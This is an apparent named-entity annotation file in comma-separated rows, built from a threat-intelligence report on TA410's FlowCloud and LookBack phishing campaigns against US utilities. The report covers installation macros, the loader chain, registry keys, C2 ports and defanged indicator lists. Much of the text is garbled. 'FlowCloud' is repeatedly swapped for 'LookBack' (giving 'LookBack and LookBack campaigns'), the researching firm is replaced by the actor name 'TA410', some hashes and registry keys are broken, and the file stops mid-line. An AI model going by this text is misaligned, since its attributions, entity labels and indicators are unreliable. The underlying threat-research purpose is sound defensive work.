ability to exfiltrate information via command and control.

We analyzed phishing campaigns between ",O
TA410,July-November 2019,timestamp
TA410," and have determined
that both",O
TA410,LookBack,campaign
TA410, and,O
TA410,LookBack,campaign
TA410," malware can be attributed to a single threat actor we
are calling",O
TA410,TA410,threat_actor
TA410,". This conclusion is based on the threat actor’s use of shared attachment
macros, malware installation techniques, and overlapping delivery infrastructure.

In addition, our analysis found similarities between",O
TA410,TA410,threat_actor
TA410, and,O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,") delivery
tactics. Specifically, we have seen attachment macros that are common to both actors.
",O
TA410,TA410,threat_actor
TA410, campaigns detected in ,O
TA410,November 2019,timestamp
TA410, included,O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,")-related
infrastructure used in phishing attachment delivery macros. However,",O
TA410,TA410,org
TA410,"
analysts believe that intentional reuse of well-publicized",O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,") techniques and
infrastructure may be an attempt by threat actors to create a false flag. For this reason,
while research is ongoing, we do not attribute",O
TA410,LookBack,campaign
TA410, and,O
TA410,LookBack,campaign
TA410," campaigns to
",O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,).,O
TA410,TA410,org
TA410, currently tracks,O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,) independently of,O
TA410,TA410,threat_actor
TA410,"
campaigns.

Figure 1 below shows a timeline of the identified",O
TA410,LookBack,campaign
TA410, and,O
TA410,LookBack,campaign
TA410," campaigns.

https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks
https://www.proofpoint.com/us/threat-insight/post/lookback-forges-ahead-continued-targeting-united-states-utilities-sector-reveals


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 3/20

Figure 1",O
TA410,LookBack,campaign
TA410, and,O
TA410,LookBack,campaign
TA410," Campaign Timeline

Delivery

",O
TA410,TA410,org
TA410, researchers observed phishing campaigns beginning on ,O
TA410,"July 10, 2019",timestamp
TA410," that
targeted utility providers across the United States with portable executable (PE)
attachments and used subject lines such as “PowerSafe energy educational courses (30-
days trial)”.  These campaigns continued through ",O
TA410,September 2019,timestamp
TA410,".

Our analysis of these phishing campaigns determined that the PE attachments delivered a
modular malware which the developers referred to in program data base (“PDB”) paths as
“",O
TA410,FlowCloud,campaign
TA410,”. We therefore refer to these campaigns as “,O
TA410,FlowCloud,campaign
TA410,"” based on the
malware family they delivered. It’s notable that these",O
TA410,LookBack,campaign
TA410," campaigns were
occurring at the same time as the",O
TA410,LookBack,campaign
TA410, campaigns that,O
TA410,TA410,org
TA410," has previously
documented. Both the",O
TA410,LookBack,campaign
TA410, and,O
TA410,LookBack,campaign
TA410," campaigns targeted utility providers in
the United States. Both used training and certification-themed lures. And both used
threat actor-controlled domains for delivery. In some cases, both",O
TA410,LookBack,campaign
TA410," and
",O
TA410,LookBack,campaign
TA410," campaigns targeted not only the same companies but also the same recipients.

The senders of the emails that delivered",O
TA410,LookBack,campaign
TA410," malware utilized threat actor-
controlled domains for delivery which impersonated energy sector training services, as
well as utilized subdomains which contained the word “engineer”.

We observed a distinct change in",O
TA410,LookBack,campaign
TA410," delivery tactics beginning with attacks
carried out in ",O
TA410,November 2019,timestamp
TA410,". The targeting of US utilities companies remained
constant, but the threat actors shifted from PE attachments to malicious macro laden
Microsoft Word documents that closely resembled the same delivery and installation
macros used in",O
TA410,LookBack,campaign
TA410," malware campaigns.

Additionally, in November threat actors began to utilize the sender domain ",O
TA410,asce[.]email,ioc
TA410,"
to deliver these attachments. This domain was first observed in ",O
TA410,June 2019,timestamp
TA410," registered to
the IP ",O
TA410,103.253.41[.]75,ioc
TA410," which was used as a staging and reconnaissance IP in previous
",O
TA410,LookBack,campaign
TA410, campaigns. On ,O
TA410,"October 29, 2019",timestamp
TA410,", the domain resolved to the IP
",O
TA410,134.209.99[.]169,ioc
TA410," which also hosted several energy certification and education themed
domains. A number of these domains also shared an SSL certificate with delivery domains



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 4/20

previously observed in the ",O
TA410,July and August 2019,timestamp
TA410,LookBack,campaign
TA410," phishing campaigns. The
data from this SSL Certificate has been displayed in Figure 2. This figure demonstrates
the actor’s use of a single SSL certificate for multiple energy and training themed
domains. The actor listed the domains that were signed by the certificate in the
Alternative Names field allowing for the identification of additional related infrastructure.
A number of these domains were used in",O
TA410,LookBack,campaign
TA410," campaigns.

Figure 2 Passive Total SSL Certificate data for powersafetrainings[.]org and related
energy themed domains.

The table below shows the",O
TA410,TA410,threat_actor
TA410," staging IPs, when they were first observed, the
registered domains associated with them, and the malware delivered by emails
originating from these domains.

IP First
Observed

Registered Domains Malware
Delivered



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 5/20

",O
TA410,103.253.41[.]75,ioc
TA410," 06/23/2019 Delivery Domain:

",O
TA410,Nceess[.]com,ioc
TA410,"

",O
TA410,Globalenergycertification[.]com,ioc
TA410,"

 

Registered Domain:

",O
TA410,Nerc[.]email,ioc
TA410,"

",O
TA410,Asce[.]email,ioc
TA410,"

",O
TA410,LookBack,campaign
TA410,"

",O
TA410,134.209.99[.]169,ioc
TA410," 10/29/2019 Delivery Domain:

",O
TA410,Asce[.]email,ioc
TA410,"

 

Registered Domain:

",O
TA410,Powersafetraining[.]net,ioc
TA410,"

 

Domains Related by SSL Certificate:

",O
TA410,mails.energysemi[.]com,ioc
TA410,"

",O
TA410,powersafetrainings[.]org,ioc
TA410,"

",O
TA410,www.mails.energysemi[.]com,ioc
TA410,"

",O
TA410,www.powersafetraining[.]net,ioc
TA410,"
",ioc
TA410,www.powersafetrainings[.]org,ioc
TA410,"

",O
TA410,LookBack,campaign
TA410,"

",O
TA410,101.99.74[.]234,ioc
TA410," 07/02/2019 Delivery Domain

",O
TA410,www.powersafetrainings[.]org,ioc
TA410,"

",O
TA410,LookBack,campaign
TA410,"

The content of the emails in the ",O
TA410,November 2019,timestamp
TA410," campaigns impersonated the American
Society of Civil Engineers and masqueraded as the legitimate domain asce[.]org. The
structure of this email is very similar to the",O
TA410,LookBack,campaign
TA410," delivery emails constructed to
impersonate the NCEES and Global Energy Certification in ",O
TA410,July 2019,timestamp
TA410,". Examples of the
emails are included in Figure 3 and Figure 4.



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 6/20

Figure 3 ASCE-themed phishing email delivering",O
TA410,LookBack,campaign
TA410, malware ,O
TA410,November 2019,timestamp
TA410,"



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 7/20

Figure 4 NCEES-themed phishing email delivering",O
TA410,LookBack,campaign
TA410, malware ,O
TA410,July 2019,timestamp
TA410,"

Exploitation - Installation Macros

As noted above, after an extended period of using PE attachments to deliver",O
TA410,LookBack,campaign
TA410," in
campaigns, the threat actors behind",O
TA410,LookBack,campaign
TA410," switched to using Microsoft Word
documents with malicious macros at the beginning of ",O
TA410,November 2019,timestamp
TA410,". The Word
document attachments and macros delivering",O
TA410,LookBack,campaign
TA410," had key similarities with the
Word document attachments and macros we identified that delivered",O
TA410,LookBack,campaign
TA410, in ,O
TA410,"July
and August 2019",timestamp
TA410,".

Identical to the methodology used with",O
TA410,LookBack,campaign
TA410,", the",O
TA410,LookBack,campaign
TA410," macro used privacy
enhanced mail (“.pem”)  files which were subsequently renamed to the text file
“pense1.txt”. This file is next saved as a portable executable file named “gup.exe” and
executed using a version of the certutil.exe tool named “Temptcm.tmp”.



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 8/20

For comparison, Figure 5 ",O
TA410,November 2019,timestamp
TA410, macro used to install,O
TA410,LookBack,campaign
TA410," malware
shows the macro used to install",O
TA410,LookBack,campaign
TA410, while Figure 6 ,O
TA410,August 2019,timestamp
TA410," macro used to
install",O
TA410,LookBack,campaign
TA410, malware shows the macro used to install,O
TA410,LookBack,campaign
TA410,".

Figure 5 ",O
TA410,November 2019,timestamp
TA410, macro used to install,O
TA410,LookBack,campaign
TA410," malware

Figure 6 ",O
TA410,August 2019,timestamp
TA410, macro used to install,O
TA410,LookBack,campaign
TA410," malware

The “Exploitation” section in our blog ",O
TA410,LookBack,campaign
TA410, Malware Targets the ,O
TA410,United States,country
TA410,"
",O
TA410,Utilities Sector,industry
TA410," with Phishing Attacks Impersonating Engineering Licensing Boards has a
more in-depth explanation of this method used by",O
TA410,LookBack,campaign
TA410,.,O
TA410,LookBack,campaign
TA410," uses this same
method exactly including identical macro concatenation code.

While we found the ultimate execution method for both the",O
TA410,LookBack,campaign
TA410," Gup proxy tool and
",O
TA410,LookBack,campaign
TA410," malware were the same across both macro versions, we found that the
",O
TA410,LookBack,campaign
TA410," macro introduced a new method for the delivery of the malware.

The earlier",O
TA410,LookBack,campaign
TA410," versions of the macro included the payload in numerous privacy
enhanced email (“.pem”) files that were dropped when the attachment file is executed by
the user. The",O
TA410,LookBack,campaign
TA410," version of the macro utilized a previously unobserved macro
section to download the payload from a DropBox URL. Once the payload was

https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 9/20

downloaded, a",O
TA410,LookBack,campaign
TA410," malware PE in the form of a .pem file was saved as the variable
“Pense1.txt”. Figure 7",O
TA410,LookBack,campaign
TA410, Malware Macro delivery code shows the,O
TA410,LookBack,campaign
TA410,"
macro with the delivery section in question called out.

Figure 7",O
TA410,LookBack,campaign
TA410," Malware Macro delivery code

The",O
TA410,LookBack,campaign
TA410," macro also contained a strange try… catch statement which initially
attempts to download the",O
TA410,LookBack,campaign
TA410," payload from the DropBox URL as part of the try
statement. However, if it was unable to retrieve the payload from that resource, a catch
statement which was nearly identical to the try statement attempted to retrieve a malware
resource from the URL ",O
TA410,http://ffca.caibi379[.]com/rwjh/qtinfo.txt,ioc
TA410,”.”. Figure 8,O
TA410,LookBack,campaign
TA410,"
Malware Catch statement macro code shows the catch statement in question.

Figure 8",O
TA410,LookBack,campaign
TA410," Malware Catch statement macro code

This try…catch sequence is significant because the URL in the catch statement and
malware resource was previously mentioned in a May 2019 blog by",O
TA410,EnSilo,org
TA410," entitled
“Uncovering New Activity by ",O
TA410,APT10,threat_actor
TA410,"”. The blog claims that this URL delivered a modified
",O
TA410,Quasar RAT,malware
TA410, payload which included the addition of ,O
TA410,SharpSploit,tool
TA410,", an opensource post-
exploitation tool. When analyzed on the same date of",O
TA410,LookBack,campaign
TA410," campaign delivery this
URL and resource was unavailable, while the DropBox URL successfully delivered the
",O
TA410,LookBack,campaign
TA410, .pem file. While,O
TA410,TA410,org
TA410," has not independently verified these attribution
claims made by other researchers regarding the referenced ",O
TA410,Quasar RAT,malware
TA410," sample, the use
of this URL represents a previously undisclosed overlap with publicly reported indicators
of compromise attributed to",O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,"). While on the surface this domain may imply
links to",O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,"), we have identified several aberrations regarding the domain
registration information and inactive nature of the URL and will discuss them at length at
length later in this blog.

https://blog.ensilo.com/uncovering-new-activity-by-",O
TA410,APT10,threat_actor
TA410,"


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 10/20

",O
TA410,LookBack,campaign
TA410," Malware

Our analysis of the",O
TA410,LookBack,campaign
TA410," malware determined that it is a multi-stage payload
comprised of a large code base written in C++. The code demonstrates a level of
complexity including numerous components, extensive object-oriented programming,
and use of legitimate and imitation QQ files for initial and later stage execution. We found
further imitation of QQ components in several modules used throughout",O
TA410,LookBack,campaign
TA410,"
execution. The malware name “",O
TA410,FlowCloud,campaign
TA410,"” was taken from distinctive PDB paths
observed in numerous malware components. These values have been included in the IOCs
section at the end of this blog.

",O
TA410,LookBack,campaign
TA410," malware is capable of RAT functionalities based on its available commands
including accessing the clipboard, installed applications, keyboard, mouse, screen, files,
services, and processes with the ability to exfiltrate information via command and
control. Additionally, the malware variants analyzed have several distinct characteristics
that indicate the malware may have been active in the threat landscape since at least ",O
TA410,"July
2016",timestamp
TA410,".

In addition to components built to target updated ",O
TA410,Windows,software
TA410," versions,",O
TA410,LookBack,campaign
TA410," samples
have dropped a 32-bit module that was only compatible with ",O
TA410,Windows,software
TA410," versions 6
(",O
TA410,Windows Vista,software
TA410,") and below. The dated nature of this binary coupled with the extensible
nature of the malware code suggests that the",O
TA410,LookBack,campaign
TA410," code base has been under
development for numerous years. Public reports around",O
TA410,LookBack,campaign
TA410," malware components
and related installation directory paths suggest that versions of this malware may have
been observed in the wild as early as ",O
TA410,July 2016,timestamp
TA410,". Additionally, development of this
malware around legitimate QQ files and the identification of malware samples uploaded
to ",O
TA410,VirusTotal,software
TA410, from ,O
TA410,Japan,country
TA410, in ,O
TA410,December 2018,timestamp
TA410, and earlier this year from ,O
TA410,Taiwan,country
TA410," indicate
that the malware may have been active for some time in Asia prior to its appearance
targeting the ",O
TA410,US,country
TA410, ,O
TA410,utilities sector,industry
TA410,".

Figure 9 Flowchart of",O
TA410,LookBack,campaign
TA410, Loader Functionality below outlines ,O
TA410,FlowCloud,campaign
TA410,"’s loader
functionality.

https://www.bleepingcomputer.com/forums/t/644821/computer-restart-every-1-2-minutes-and-bsod/


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 11/20

Figure 9 Flowchart of",O
TA410,LookBack,campaign
TA410," Loader Functionality

The malware begins with the execution of ",O
TA410,Gup.exe,ioc
TA410," by the malicious macro which in
turn executes the file ",O
TA410,EhStorAuthn.exe,ioc
TA410,".



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 12/20

",O
TA410,EhStorAuthn.exe,ioc
TA410," extracts the subsequent payload file components and installs them
to the directory ",O
TA410,C:\Windows\Media\SystemPCAXD\ado\fc,ioc
TA410,". This file also sets
registry key values that store the keylogger drivers and the malware configuration as
the value “",O
TA410,KEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\,ioc
TA410,<,ioc
TA410,2-4>,ioc
TA410,"”.
",O
TA410,EhStorAuthn.exe,ioc
TA410," is a legitimate portable executable file used by QQ with the initial
name ",O
TA410,QQSetupEx.exe,ioc
TA410,. This file is used to load the file ,O
TA410,dlcore.dll,ioc
TA410," as part of its natural
downloader routine.
",O
TA410,Dlcore.dll,ioc
TA410," is a DLL crafted by the threat actors that functions as a shellcode injector
pulling the shellcode from a file named ",O
TA410,rebare.dat,ioc
TA410,". This file imitates a legitimate QQ
component.
 When the shellcode within rebare.dat is executed it in turn executes a RAT installer
file named ",O
TA410,rescure.dat,ioc
TA410,".
 ",O
TA410,Rescure.dat,ioc
TA410," is an XOR encrypted DLL file that installs the RAT based application
",O
TA410,responsor.dat,ioc
TA410," which installs the keylogger driver and manages the RAT
functionality.
",O
TA410,Responsor.dat,ioc
TA410, unpacks several modules (,O
TA410,rescure86.dat,ioc
TA410, or ,O
TA410,rescure64.dat,ioc
TA410,") to the
registry ",O
TA410,%TEMP%\{0d47c9bc-7b04-4d81-9ad8-b2e00681de8e},ioc
TA410,""" and installs the
unpacked file as a service named “FSFilter Activity Monitor” or “FltMgr”.
Finally, ",O
TA410,Responsor.dat,ioc
TA410, starts the RAT when the ,O
TA410,rescure.dat,ioc
TA410," function “startModule”
is called.
Several legitimate ",O
TA410,Microsoft Windows,software
TA410," files were also used by the malware for
thread injection.
",O
TA410,EhStorAuthn_shadow.exe,ioc
TA410, (,O
TA410,hhw.exe,ioc
TA410,") a Microsoft HTML Help Workshop file was
used as a placeholder for thread injection.
",O
TA410,Hha.dll,ioc
TA410," is a component of Microsoft HTML Help Workshop and is required to run
",O
TA410,EhStorAuthn_shadow.exe,ioc
TA410,".

The malware stores its configuration in the registry alongside drivers utilized by the
malware’s keylogger components. Several additional distinct registry keys are generated
which indicate the malware’s current execution stage on the host. Some of these keys are
included in the table below.

Registry Key Originating
Component

Description

",O
TA410,"HKEY_LOCAL_MACHINE\SYSTEM\Setup\Print
Responsor\2",ioc
TA410,"

",O
TA410,Gup.exe,ioc
TA410," 32bit Driver,
Keylogger

",O
TA410,"HKEY_LOCAL_MACHINE\SYSTEM\Setup\Print
Responsor\3",ioc
TA410,"

",O
TA410,Gup.exe,ioc
TA410," 64bit Driver,
Keylogger

",O
TA410,"HKEY_LOCAL_MACHINE\SYSTEM\Setup\Print
Responsor\4",ioc
TA410,"

",O
TA410,Gup.exe,ioc
TA410," RAT config



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 13/20

",O
TA410,"HKEY_LOCAL_MACHINE\HARDWARE\{2D-
B80286-1784-48b5-A751-B6ED1F490303}",ioc
TA410,"

",O
TA410,Dlcore.dll,ioc
TA410," Execution Stage Ex-
ecuting ",O
TA410,dlcore.dll,ioc
TA410,"

",O
TA410,"HKEY_LOCAL_MACHINE\HARDWARE\
{804423C2-F490-4ac3-BFA5-13DEDE63A71A}",ioc
TA410,"

",O
TA410,rescure.dat,ioc
TA410," Execution Stage In-
stall keylogger driver

",O
TA410,"HKEY_LOCAL_MACHINE\HARDWARE\
{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}",ioc
TA410,"

",O
TA410,rescure.dat,ioc
TA410," Execution Stage 

RAT fully installed.

",O
TA410,LookBack,campaign
TA410," Configuration

The",O
TA410,LookBack,campaign
TA410, loader component ,O
TA410,EhStorAuthn.exe,ioc
TA410," stores the malware configuration in
the registry early in the installation chain and is represented in the table above. The
Registry data is composed of multiple encrypted headers (using XORs and RORs) and
data is encrypted using a modified (or broken) AES algorithm. The plaintext data is
compressed with ZLIB and serialized using Google’s Protocol Buffers.  Figure 10 shows an
example of a configuration as displayed by FlowCloud’s debug logging:

Figure 10 Example of a configuration as displayed by debug logging



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 14/20

Command and Control

",O
TA410,LookBack,campaign
TA410," malware handles configuration updates, file exfiltration, and commands as
independent threads utilizing a custom binary C2 protocol. We identified these
independent threads as part of an extensive command handling functionality with
distinct command managers existing for each command. The sample we analyzed utilized
port 55555 for file exfiltration and port 55556 for all other data. We identified",O
TA410,LookBack,campaign
TA410,"
communication with the IP ",O
TA410,188.131.233[.]27,ioc
TA410,". The requests and responses are composed
of multiple encrypted headers (using XORs and RORs) and TEA encrypted data using a
key generation scheme involving a hardcoded string of random characters and MD5
hashing. The plaintext data is compressed using ZLIB and serialized using Google’s
Protocol Buffers. An example parsing of an initial beacon is demonstrated in Figure 11
Example of",O
TA410,LookBack,campaign
TA410," parsing an initial C2 beacon:



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 15/20

Figure 11 Example of",O
TA410,LookBack,campaign
TA410," parsing an initial C2 beacon

Comparing Public",O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,) Indicators with,O
TA410,TA410,threat_actor
TA410," Campaigns



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 16/20

Publications by",O
TA410,FireEye,org
TA410, and,O
TA410,EnSilo,org
TA410, regarding,O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,") campaigns contain
indicators that later appeared in",O
TA410,TA410,threat_actor
TA410," campaigns. In our retrospective analysis of that
research, we determined that",O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,") used phishing macros that were later seen
being used by",O
TA410,LookBack,campaign
TA410, and,O
TA410,LookBack,campaign
TA410," malware. Additionally, we identified the Quasar
RAT delivery URL ",O
TA410,hxxp://ffca.caibi379[.]com/rwjh/qtinfo.txt,ioc
TA410, used by,O
TA410,LookBack,campaign
TA410," macros
in November, which was published in the",O
TA410,EnSilo,org
TA410," report prior to observable weaponization
for",O
TA410,TA410,threat_actor
TA410," campaigns.

Interestingly, the compilation date of several",O
TA410,LookBack,campaign
TA410, malware modules used in ,O
TA410,"July
2019",timestamp
TA410, were ,O
TA410,"September 14, 2018",timestamp
TA410,". This includes the SodomMain and SodomNormal
modules covered in previous",O
TA410,TA410,org
TA410, blogs on,O
TA410,LookBack,campaign
TA410," malware. That date is just one
day after",O
TA410,FireEye,org
TA410, released their initial analysis of similar,O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,") macros utilized
in ",O
TA410,Japan,country
TA410, on ,O
TA410,"September 13, 2018",timestamp
TA410,".

While",O
TA410,LookBack,campaign
TA410, malware samples were not observed in the wild until ,O
TA410,June 2019,timestamp
TA410,", this
",O
TA410,September 2018,timestamp
TA410," compilation date demonstrates a large lag time between compilation and
delivery. This possibly suggests manipulation of compilation times by threat actors but
has not been conclusively determined.

The first identified server installation by",O
TA410,TA410,threat_actor
TA410," on actor-controlled infrastructure
occurred in December 2018. Most of the domain registration (weaponization) for
",O
TA410,LookBack,campaign
TA410, and,O
TA410,LookBack,campaign
TA410," campaigns began in May and June 2019 respectively. These
events were after FireEye’s initial publication in ",O
TA410,September 2018,timestamp
TA410,".

Additionally, enSilo’s publication on potentially",O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,) related ,O
TA410,Quasar RAT,malware
TA410,"
samples was published on ",O
TA410,"May 24, 2019",timestamp
TA410,. It was not until the second week of ,O
TA410,"November
2019",timestamp
TA410," when the inactive URL was incorporated into a phishing macro as part of a
",O
TA410,LookBack,campaign
TA410, campaign targeting ,O
TA410,US,country
TA410," utilities. WHOIS records and passive DNS information
for ",O
TA410,ffca.caibi379[.]com,ioc
TA410," indicate that the registrant email and address fields for the
domain were updated on ",O
TA410,"June 7, 2019",timestamp
TA410,". The A record for the domain was updated on
",O
TA410,"September 9, 2019",timestamp
TA410, at which time it resolved to the IP ,O
TA410,34.80.27[.]200,ioc
TA410," contained within an
ASN owned by Google. For the prior eight months beginning on January 2, 2019 and
encompassing the period of activity discussed by",O
TA410,EnSilo,org
TA410,", the domain was hosted on
several IP’s in an ASN owned by ",O
TA410,APNIC,org
TA410," Hostmaster. The shift away from IP
infrastructure owned by ",O
TA410,APNIC,org
TA410," represents a departure in threat actor infrastructure
hosting tactics well after the publication by",O
TA410,EnSilo,org
TA410," and within the weaponization period
for TA410’s campaign targeting ",O
TA410,US,country
TA410," utilities. While this research is not conclusive, it
demonstrates that all observed",O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,") similarities and indicators of compromise
were available publicly prior to the start of",O
TA410,TA410,threat_actor
TA410," campaigns. Therefore, while not
conclusive from current analysis, the possibility remains that these overlaps represent
false flag activity by the",O
TA410,TA410,threat_actor
TA410, threat actor. Based on this analysis,O
TA410,TA410,org
TA410," analysts
track",O
TA410,TA410,threat_actor
TA410, as a distinct threat actor from,O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,") at this time.

Conclusion

https://www.fireeye.com/blog/threat-research/2018/09/APT10-targeting-japanese-corporations-using-updated-ttps.html


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 17/20

The convergence of",O
TA410,LookBack,campaign
TA410, and,O
TA410,LookBack,campaign
TA410, malware campaigns in ,O
TA410,November 2019,timestamp
TA410,"
demonstrates the capabilities of",O
TA410,TA410,threat_actor
TA410," actors to distinctly utilize multiple tools as part of
a single ongoing campaign against US utilities providers. Both malware families
demonstrate a level of sophistication in their conception and development while the
extensible code base of",O
TA410,LookBack,campaign
TA410," malware suggests that this group may have been
operating ",O
TA410,as early as 2016,timestamp
TA410,.,O
TA410,TA410,threat_actor
TA410," operators demonstrate a willingness to dynamically
evolve phishing tactics to increase the effectiveness of their campaigns and a keen eye
towards plausible social engineering within a very select targeted sector. It remains
unclear if the nature of the tactics and indicators that are shared with",O
TA410,TA429,threat_actor
TA410, (,O
TA410,APT10,threat_actor
TA410,")
were developed by this group or culled from readily available technical reporting that pre-
dated these campaigns. The possibility remains that these overlaps represent intentional
false flag efforts to cloak the identity of these perpetrators while they targeted a critical
and geo-politically sensitive sector of energy providers in the ",O
TA410,US,country
TA410,". Regardless of the actor’s
intention,",O
TA410,TA410,threat_actor
TA410," has established itself as a motivated actor with mature toolsets carrying
out long term campaigns against highly important and geographically concentrated target
sets.

Indicators of Compromise (IOCs)

IOC IOC
Type

",O
TA410,faa80e0692ba120e38924ccd46f6be3c25b8edf7cddaa8960fe9ea632dc4a045,ioc
TA410," SHA256

",O
TA410,b7960d1f40b727bbea18a0e5c62bafcb54c9ec73be3e69e787b7ddafd2aae364,ioc
TA410," SHA256

",O
TA410,26eb8a1f0bdde626601d039ea0f2c92a7921152371bafe5e811c6a1831f071ce,ioc
TA410," SHA256

",O
TA410,cd8f877c9a1c31179b633fd74bd5050e4d48eda29244230348c6f84878d0c33c,ioc
TA410," SHA256

",O
TA410,e4ad5d3213425c58778d8a0244df4cd99c748f58852d8ac71b46326efd5b3220,ioc
TA410," SHA256

",O
TA410,589229e2bd93100049909edf9825dce24ff963a0c465d969027db34e2eb878b4,ioc
TA410,"

SHA256

1334 742f2 7 8412d76b 228b99935 49d SHA256



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 18/20

",O
TA410,1334c742f2aec7e8412d76ba228b99935a49dc96a1e8e1f3446d9f61247ae47e,ioc
TA410,"

SHA256

",O
TA410,de30929ef958211f9315e27a7aa45ef061726a76990ddc6b9d9f189b9fbdd45a,ioc
TA410," SHA256

",O
TA410,0b013ccd9e10d7589994629aed18ffe2388cbd745b5b28ab39c07835295a1ca9,ioc
TA410,"

SHA256

",O
TA410,479954b9e7d5c5f7086a2a1ff1dba99de2eab2e1b1bc75ad8f3b211088eb4ee9,ioc
TA410," SHA256

",O
TA410,"d5191327a984fab990bfb0e811688e65e9aaa751c3d93-
fa92487e8a95cb2eea8",ioc
TA410,"

SHA256

",O
TA410,0701cc7eb1af616294e90cbb35c99fa2b29d2aada9fcbdcdaf578b3fcf9b56c7,ioc
TA410," SHA256

",O
TA410,27f5df1d35744cf283702fce384ce8cfb2f240bae5d725335ca1b90d6128bd40,ioc
TA410," SHA256

",O
TA410,13e761f459c87c921dfb985cbc6489060eb86b4200c4dd99692d6936de8df5ba,ioc
TA410," SHA256

",O
TA410,2481fd08abac0bfefe8d8b1fa3beb70f8f9424a1601aa08e195c0c14e1547c27,ioc
TA410," SHA256

",O
TA410,188.131.233[.]27,ioc
TA410," IP

",O
TA410,118.25.97[.]43,ioc
TA410," IP

",O
TA410,34.80.27[.]200,ioc
TA410," IP

",O
TA410,134.209.99[.]169,ioc
TA410," IP

",O
TA410,101.99.74[.]234,ioc
TA410," IP

",O
TA410,Asce[.]email,ioc
TA410," Domain

",O
TA410,powersafetrainings[.]org,ioc
TA410," Domain



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 19/20

",O
TA410,mails.daveengineer[.]com,ioc
TA410," Domain

",O
TA410,powersafetraining[.]net,ioc
TA410," Domain

",O
TA410,mails.energysemi[.]com,ioc
TA410," Domain

",O
TA410,www.mails.energysemi[.]com,ioc
TA410," Domain

",O
TA410,www.powersafetraining[.]net,ioc
TA410," Domain

",O
TA410,www.powersafetrainings[.]org,ioc
TA410," Domain

",O
TA410,ffca.caibi379[.]com,ioc
TA410," Domain

",O
TA410,http://ffca.caibi379[.]com/rwjh/qtinfo.txt,ioc
TA410," URL

",O
TA410,https://www.dropbox[.]com:443/s/ddgifm4ityqwx60/Cert.pem?dl=1,ioc
TA410," URL

",O
TA410,HKEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\2,ioc
TA410," Registry
Key

",O
TA410,HKEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\3,ioc
TA410," Registry
Key

",O
TA410,HKEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\4,ioc
TA410," Registry
Key

",O
TA410,"HKEY_LOCAL_MACHINE\HARDWARE\{2DB80286-1784-48b5-A751-
B6ED1F490303}",ioc
TA410,"

Registry
Key

",O
TA410,"HKEY_LOCAL_MACHINE\HARDWARE\{804423C2-F490-4ac3-BFA5-
13DEDE63A71A}",ioc
TA410,"

Registry
Key

",O
TA410,HKEY LOCAL MACHINE\HARDWARE\{A5124AF5 DF23 49bf B0ED R i t,ioc
TA410,"



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 20/20

ET and ETPRO Suricata/SNORT Signatures

2837783 ETPRO TROJAN ",O
